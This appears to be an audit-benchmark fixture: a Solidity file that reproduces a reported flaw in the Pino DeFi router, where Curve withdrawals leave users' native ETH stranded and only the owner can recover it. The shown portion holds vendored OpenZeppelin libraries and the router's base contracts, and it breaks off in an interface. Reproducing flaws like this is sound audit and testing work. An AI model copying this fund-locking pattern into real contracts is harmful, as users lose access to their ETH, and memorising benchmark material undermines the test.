// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

// =============================================================================
// AuditVault #27249 — Pino C-01: `Curve::withdraw` strands users' native ETH.
//
// REAL audited source (verbatim below): nitolabs/pino-contract @ e11214c8
//   contracts/protocols/v2/Curve.sol, base/BaseProtocolProxy.sol, base/Multicall.sol,
//   base/Permit.sol, interfaces/{IWETH9,IPermit2,Curve/ICurve,Curve/ICurvePool}.sol
// plus verbatim OpenZeppelin v4.9 (Ownable2Step / SafeERC20 / Context / Address).
//
// The Curve-style ETH pool (MockCurveEthPool) is the opaque external venue: on
// remove_liquidity it returns coin0 as NATIVE ETH to the caller, exactly like a
// real Curve ETH pool (e.g. the stETH pool the audit PoC used). `Curve.withdraw`
// never wraps that ETH to WETH (unlike withdrawOneCoinI/U) and the router exposes
// no user-facing ETH sweep -> the ETH is stranded and only the owner can take it.
// =============================================================================

// ================= Context.sol =================
// OpenZeppelin Contracts (last updated v4.9.4) (utils/Context.sol)


/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}

// ================= Ownable.sol =================
// OpenZeppelin Contracts (last updated v4.9.0) (access/Ownable.sol)



/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// ================= Ownable2Step.sol =================
// OpenZeppelin Contracts (last updated v4.9.0) (access/Ownable2Step.sol)



/**
 * @dev Contract module which provides access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership} and {acceptOwnership}.
 *
 * This module is used through inheritance. It will make available all functions
 * from parent (Ownable).
 */
abstract contract Ownable2Step is Ownable {
    address private _pendingOwner;

    event OwnershipTransferStarted(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Returns the address of the pending owner.
     */
    function pendingOwner() public view virtual returns (address) {
        return _pendingOwner;
    }

    /**
     * @dev Starts the ownership transfer of the contract to a new account. Replaces the pending transfer if there is one.
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual override onlyOwner {
        _pendingOwner = newOwner;
        emit OwnershipTransferStarted(owner(), newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`) and deletes any pending owner.
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual override {
        delete _pendingOwner;
        super._transferOwnership(newOwner);
    }

    /**
     * @dev The new owner accepts the ownership transfer.
     */
    function acceptOwnership() public virtual {
        address sender = _msgSender();
        require(pendingOwner() == sender, "Ownable2Step: caller is not the new owner");
        _transferOwnership(sender);
    }
}

// ================= IERC20.sol =================
// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)


/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

// ================= IERC20Permit.sol =================
// OpenZeppelin Contracts (last updated v4.9.4) (token/ERC20/extensions/IERC20Permit.sol)


/**
 * @dev Interface of the ERC20 Permit extension allowing approvals to be made via signatures, as defined in
 * https://eips.ethereum.org/EIPS/eip-2612[EIP-2612].
 *
 * Adds the {permit} method, which can be used to change an account's ERC20 allowance (see {IERC20-allowance}) by
 * presenting a message signed by the account. By not relying on {IERC20-approve}, the token holder account doesn't
 * need to send a transaction, and thus is not required to hold Ether at all.
 *
 * ==== Security Considerations
 *
 * There are two important considerations concerning the use of `permit`. The first is that a valid permit signature
 * expresses an allowance, and it should not be assumed to convey additional meaning. In particular, it should not be
 * considered as an intention to spend the allowance in any specific way. The second is that because permits have
 * built-in replay protection and can be submitted by anyone, they can be frontrun. A protocol that uses permits should
 * take this into consideration and allow a `permit` call to fail. Combining these two aspects, a pattern that may be
 * generally recommended is:
 *
 * ```solidity
 * function doThingWithPermit(..., uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public {
 *     try token.permit(msg.sender, address(this), value, deadline, v, r, s) {} catch {}
 *     doThing(..., value);
 * }
 *
 * function doThing(..., uint256 value) public {
 *     token.safeTransferFrom(msg.sender, address(this), value);
 *     ...
 * }
 * ```
 *
 * Observe that: 1) `msg.sender` is used as the owner, leaving no ambiguity as to the signer intent, and 2) the use of
 * `try/catch` allows the permit to fail and makes the code tolerant to frontrunning. (See also
 * {SafeERC20-safeTransferFrom}).
 *
 * Additionally, note that smart contract wallets (such as Argent or Safe) are not able to produce permit signatures, so
 * contracts should have entry points that don't rely on permit.
 */
interface IERC20Permit {
    /**
     * @dev Sets `value` as the allowance of `spender` over ``owner``'s tokens,
     * given ``owner``'s signed approval.
     *
     * IMPORTANT: The same issues {IERC20-approve} has related to transaction
     * ordering also apply here.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `deadline` must be a timestamp in the future.
     * - `v`, `r` and `s` must be a valid `secp256k1` signature from `owner`
     * over the EIP712-formatted function arguments.
     * - the signature must use ``owner``'s current nonce (see {nonces}).
     *
     * For more information on the signature format, see the
     * https://eips.ethereum.org/EIPS/eip-2612#specification[relevant EIP
     * section].
     *
     * CAUTION: See Security Considerations above.
     */
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    /**
     * @dev Returns the current nonce for `owner`. This value must be
     * included whenever a signature is generated for {permit}.
     *
     * Every successful call to {permit} increases ``owner``'s nonce by one. This
     * prevents a signature from being used multiple times.
     */
    function nonces(address owner) external view returns (uint256);

    /**
     * @dev Returns the domain separator used in the encoding of the signature for {permit}, as defined by {EIP712}.
     */
    // solhint-disable-next-line func-name-mixedcase
    function DOMAIN_SEPARATOR() external view returns (bytes32);
}

// ================= Address.sol =================
// OpenZeppelin Contracts (last updated v4.9.0) (utils/Address.sol)


/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     *
     * Furthermore, `isContract` will also return true if the target contract within
     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,
     * which only has an effect at the end of a transaction.
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling
     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.
     *
     * _Available since v4.8._
     */
    function verifyCallResultFromTarget(
        address target,
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        if (success) {
            if (returndata.length == 0) {
                // only check isContract if the call was successful and the return data is empty
                // otherwise we already know that it was a contract
                require(isContract(target), "Address: call to non-contract");
            }
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    /**
     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason or using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    function _revert(bytes memory returndata, string memory errorMessage) private pure {
        // Look for revert reason and bubble it up if present
        if (returndata.length > 0) {
            // The easiest way to bubble the revert reason is using memory via assembly
            /// @solidity memory-safe-assembly
            assembly {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert(errorMessage);
        }
    }
}

// ================= SafeERC20.sol =================
// OpenZeppelin Contracts (last updated v4.9.3) (token/ERC20/utils/SafeERC20.sol)



/**
 * @title SafeERC20
 * @dev Wrappers around ERC20 operations that throw on failure (when the token
 * contract returns false). Tokens that return no value (and instead revert or
 * throw on failure) are also supported, non-reverting calls are assumed to be
 * successful.
 * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,
 * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.
 */
library SafeERC20 {
    using Address for address;

    /**
     * @dev Transfer `value` amount of `token` from the calling contract to `to`. If `token` returns no value,
     * non-reverting calls are assumed to be successful.
     */
    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    /**
     * @dev Transfer `value` amount of `token` from `from` to `to`, spending the approval given by `from` to the
     * calling contract. If `token` returns no value, non-reverting calls are assumed to be successful.
     */
    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    /**
     * @dev Deprecated. This function has issues similar to the ones found in
     * {IERC20-approve}, and its usage is discouraged.
     *
     * Whenever possible, use {safeIncreaseAllowance} and
     * {safeDecreaseAllowance} instead.
     */
    function safeApprove(IERC20 token, address spender, uint256 value) internal {
        // safeApprove should only be called when setting an initial allowance,
        // or when resetting it to zero. To increase and decrease it, use
        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    /**
     * @dev Increase the calling contract's allowance toward `spender` by `value`. If `token` returns no value,
     * non-reverting calls are assumed to be successful.
     */
    function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        uint256 oldAllowance = token.allowance(address(this), spender);
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, oldAllowance + value));
    }

    /**
     * @dev Decrease the calling contract's allowance toward `spender` by `value`. If `token` returns no value,
     * non-reverting calls are assumed to be successful.
     */
    function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, oldAllowance - value));
        }
    }

    /**
     * @dev Set the calling contract's allowance toward `spender` to `value`. If `token` returns no value,
     * non-reverting calls are assumed to be successful. Meant to be used with tokens that require the approval
     * to be set to zero before setting it to a non-zero value, such as USDT.
     */
    function forceApprove(IERC20 token, address spender, uint256 value) internal {
        bytes memory approvalCall = abi.encodeWithSelector(token.approve.selector, spender, value);

        if (!_callOptionalReturnBool(token, approvalCall)) {
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, 0));
            _callOptionalReturn(token, approvalCall);
        }
    }

    /**
     * @dev Use a ERC-2612 signature to set the `owner` approval toward `spender` on `token`.
     * Revert on invalid signature.
     */
    function safePermit(
        IERC20Permit token,
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal {
        uint256 nonceBefore = token.nonces(owner);
        token.permit(owner, spender, value, deadline, v, r, s);
        uint256 nonceAfter = token.nonces(owner);
        require(nonceAfter == nonceBefore + 1, "SafeERC20: permit did not succeed");
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     */
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We use {Address-functionCall} to perform this call, which verifies that
        // the target address contains contract code and also asserts for success in the low-level call.

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        require(returndata.length == 0 || abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     *
     * This is a variant of {_callOptionalReturn} that silents catches all reverts and returns a bool instead.
     */
    function _callOptionalReturnBool(IERC20 token, bytes memory data) private returns (bool) {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We cannot use {Address-functionCall} here since this should return false
        // and not revert is the subcall reverts.

        (bool success, bytes memory returndata) = address(token).call(data);
        return
            success && (returndata.length == 0 || abi.decode(returndata, (bool))) && Address.isContract(address(token));
    }
}

// ================= IPermit2.sol =================

/**
 * @title SignatureTransfer
 * @notice Handles ERC20 token transfers through signature based actions
 * @dev Requires user's token approval on the Permit2 contract
 */
interface IPermit2 {
    /**
     * @notice The token and amount details for a transfer signed in the permit transfer signature
     */
    struct TokenPermissions {
        // ERC20 token address
        address token;
        // the maximum amount that can be spent
        uint256 amount;
    }

    /**
     * @notice The signed permit message for a single token transfer
     */
    struct PermitTransferFrom {
        TokenPermissions permitted;
        // a unique value for every token owner's signature to prevent signature replays
        uint256 nonce;
        // deadline on the permit signature
        uint256 deadline;
    }

    /**
     * @notice Specifies the recipient address and amount for batched transfers.
     * @dev Recipients and amounts correspond to the index of the signed token permissions array.
     * @dev Reverts if the requested amount is greater than the permitted signed amount.
     */
    struct SignatureTransferDetails {
        // recipient address
        address to;
        // spender requested amount
        uint256 requestedAmount;
    }

    /**
     * @notice Used to reconstruct the signed permit message for multiple token transfers
     * @dev Do not need to pass in spender address as it is required that it is msg.sender
     * @dev Note that a user still signs over a spender address
     */
    struct PermitBatchTransferFrom {
        // the tokens and corresponding amounts permitted for a transfer
        TokenPermissions[] permitted;
        // a unique value for every token owner's signature to prevent signature replays
        uint256 nonce;
        // deadline on the permit signature
        uint256 deadline;
    }

    /**
     * @notice Transfers a token using a signed permit message
     * @dev Reverts if the requested amount is greater than the permitted signed amount
     * @param permit The permit data signed over by the owner
     * @param owner The owner of the tokens to transfer
     * @param transferDetails The spender's requested transfer details for the permitted token
     * @param signature The signature to verify
     */
    function permitTransferFrom(
        PermitTransferFrom calldata permit,
        SignatureTransferDetails calldata transferDetails,
        address owner,
        bytes calldata signature
    ) external;

    /**
     * @notice Transfers multiple tokens using a signed permit message
     * @param permit The permit data signed over by the owner
     * @param owner The owner of the tokens to transfer
     * @param transferDetails Specifies the recipient and requested amount for the token transfer
     * @param signature The signature to verify
     */
    function permitTransferFrom(
        PermitBatchTransferFrom calldata permit,
        SignatureTransferDetails[] calldata transferDetails,
        address owner,
        bytes calldata signature
    ) external;
}

// ================= IWETH9.sol =================


/**
 * @notice IWETH9 WETH interface
 */
interface IWETH9 is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

// ================= Multicall.sol =================

/**
 * @title Handles multicall function
 * @author Pino development team
 */
contract Multicall {
    uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;
    uint256 private _status;

    /**
     * @notice Thrown when the nonETHReuse modifier is called twice in the multicall
     */
    error EtherReuseGuardCall();

    /**
     * @dev Prevents a caller from calling multiple functions that work with ETH in a transaction
     */
    modifier nonETHReuse() {
        _nonReuseBefore();
        _;
    }

    /**
     * @notice Sets status to NOT_ENTERED
     */
    constructor() payable {
        _status = NOT_ENTERED;
    }

    /**
     * @notice Multiple calls on proxy functions
     * @param _calldata An array of calldata that is called one by one
     * @dev The other param is for the referral program of the Pino server
     */
    function multicall(bytes[] calldata _calldata, uint256) external payable {
        // Unlock ether locker just in case if it was locked before
        unlockETHReuse();

        // Loop through each calldata and execute them
        for (uint256 i = 0; i < _calldata.length;) {
            (bool success, bytes memory result) = address(this).delegatecall(_calldata[i]);

            // Check if the call was successful or not
            if (!success) {
                // Next 7 lines from https://ethereum.stackexchange.com/a/83577
                if (result.length < 68) revert();

                assembly {
                    result := add(result, 0x04)
                }

                revert(abi.decode(result, (string)));
            }

            // Increment variable i more efficiently
            unchecked {
                ++i;
            }
        }

        /*
         * To ensure proper execution, unlock reusability for future use.
         * In some cases, the caller might invoke a function with the 'nonETHReuse'
         * modifier directly, bypassing the 'unlockETHReuse' step at the beginning of the
         * multicall. This would render the function unusable if not unlocked here.
         */
        unlockETHReuse();
    }

    /**
     * @notice Unlocks the reentrancy
     * @dev Should be used before and after all the calls
     */
    function unlockETHReuse() internal {
        _status = NOT_ENTERED;
    }

    function _nonReuseBefore() private {
        // On the first call to nonETHReuse, _status will be NOT_ENTERED
        if (_status == ENTERED) {
            revert EtherReuseGuardCall();
        }

        // Any calls to nonETHReuse after this point will fail
        _status = ENTERED;
    }
}

// ================= Permit.sol =================


/**
 * @title Permit2 SignatureTransfer functions
 * @author Pino development team
 */
contract Permit {
    IPermit2 public immutable permit2;

    /**
     * @notice Sets permit2 contract address
     * @param _permit2 Permit2 contract address
     */
    constructor(address _permit2) payable {
        permit2 = IPermit2(_permit2);
    }

    /**
     * @notice Transfers 1 token from user to the contract using Permit2
     * @param _permit PermitTransferFrom data struct
     * @param _signature EIP712 Signature of the Permit2 data structure
     */
    function permitTransferFrom(IPermit2.PermitTransferFrom calldata _permit, bytes calldata _signature)
        public
        payable
    {
        permit2.permitTransferFrom(
            _permit,
            IPermit2.SignatureTransferDetails({to: address(this), requestedAmount: _permit.permitted.amount}),
            msg.sender,
            _signature
        );
    }

    /**
     * @notice Transfers multiple tokens from user to the contract using Permit2
     * @param _permit permitBatchTransferFrom data struct
     * @param _signature EIP712 Signature of the Permit2 data structure
     */
    function permitBatchTransferFrom(IPermit2.PermitBatchTransferFrom calldata _permit, bytes calldata _signature)
        external
        payable
    {
        uint256 tokensLen = _permit.permitted.length;

        IPermit2.SignatureTransferDetails[] memory details = new IPermit2.SignatureTransferDetails[](tokensLen);

        for (uint256 i = 0; i < tokensLen;) {
            details[i].to = address(this);
            details[i].requestedAmount = _permit.permitted[i].amount;

            unchecked {
                ++i;
            }
        }

        permit2.permitTransferFrom(_permit, details, msg.sender, _signature);
    }
}

// ================= BaseProtocolProxy.sol =================



/**
 * @title Handles payment and approve functions
 * @author Pino development team
 */
contract BaseProtocolProxy is Permit, Multicall, Ownable2Step {
    using SafeERC20 for IERC20;

    IWETH9 public immutable weth;
    address internal constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    /**
     * @notice Thrown when the ETH transfer call is failed
     * @param _caller Address of the caller of the transaction
     * @param _recipient Address of the recipient receiving ETH
     */
    error FailedToSendEther(address _caller, address _recipient);

    /**
     * @notice Thrown when the amount of ETH to transfer is 0
     */
    error InvalidAmountToTransfer();

    /**
     * @notice Proxy contract constructor, sets permit2 and weth addresses
     * @param _permit2 Permit2 contract address
     * @param _weth WETH9 contract address
     */
    constructor(address _permit2, address _weth) payable Permit(_permit2) {
        weth = IWETH9(_weth);
    }

    receive() external payable {}

    /**
     * @notice Withdraws ETH and transfers to the recipient
     * @param _recipient Address of the destination receiving the fees
     */
    function withdrawAdmin(address _recipient) external onlyOwner {
        _sendETH(_recipient, address(this).balance);
    }

    /**
     * @notice Approves an ERC20 token to multiple spenders
     * @param _token ERC20 token address
     * @param _spenders The spender which spends the tokens (usually DeFi protocols)
     */
    function approveToken(IERC20 _token, address[] calldata _spenders) external payable {
        for (uint256 i = 0; i < _spenders.length;) {
            _token.forceApprove(_spenders[i], type(uint256).max);

            unchecked {
                ++i;
            }
        }
    }

    /**
     * @notice Wraps ETH to WETH
     * @param _proxyFeeInWei Fee of the proxy contract
     */
    function wrapETH(uint256 _proxyFeeInWei) external payable nonETHReuse {
        weth.deposit{value: msg.value - _proxyFeeInWei}();
    }

    /**
     * @notice Unwraps total amount of WETH9 to ETH and transfers the amount to the recipient
     * @param _recipient The destination address
     */
    function unwrapWETH9(address _recipient) external payable {
        uint256 balanceWETH = weth.balanceOf(address(this));

        if (balanceWETH > 0) {
            weth.withdraw(balanceWETH);

            _sendETH(_recipient, balanceWETH);
        }
    }

    /**
     * @notice Sweeps the total amount of tokens to inside the contract to the recipient
     * @param _token ERC20 token address
     * @param _recipient The destination address
     * @return amount Transferred amount of the token
     */
    function sweepToken(IERC20 _token, address _recipient) public payable returns (uint256 amount) {
        amount = _token.balanceOf(address(this));

        if (amount > 0) {
            _token.safeTransfer(_recipient, amount);
        }
    }

    /**
     * @notice Transfer ETH to the destination
     * @param _recipient The destination address
     * @param _amount Ether amount
     */
    function _sendETH(address _recipient, uint256 _amount) internal {
        if (_amount == 0) {
            revert InvalidAmountToTransfer();
        }

        (bool success,) = _recipient.call{value: _amount}("");

        if (!success) {
            revert FailedToSendEther(msg.sender, _recipient);
        }
    }
}

// ================= ICurvePool.sol =================

/**
 * @title Curve Pool interface
 * @author Curve.Fi
 * @notice Minimal pool implementation with no lending
 */
interface ICurvePool {
    /**
     * @notice Deposit coins into the pool
     * @param _amounts List of amounts of coins to deposit
     * @param _min_mint_amount Minimum amount of LP tokens to mint from the deposit
     */
    function add_liquidity(uint256[2] calldata _amounts, uint256 _min_mint_amount) external payable;

    /**
     * @notice Withdraw coins from the pool
     * @dev Withdrawal amounts are based on current deposit ratios
     * @param _amount Quantity of LP tokens to burn in the withdrawal
     * @param _min_amounts Minimum amounts of underlying coins to receive
     */
    function remove_liquidity(uint256 _amount, uint256[2] calldata _min_amounts) external;

    /**
     * @notice Withdraw a single coin from the pool
     * @param _amount Amount of LP tokens to burn in the withdrawal
     * @param _i Index value of the coin to withdraw
     * @param _min Minimum amount of coin to receive
     * @return Amount of coin received
     */
    function remove_liquidity_one_coin(uint256 _amount, uint256 _i, uint256 _min) external returns (uint256);

    /**
     * @notice Withdraw a single coin from the pool
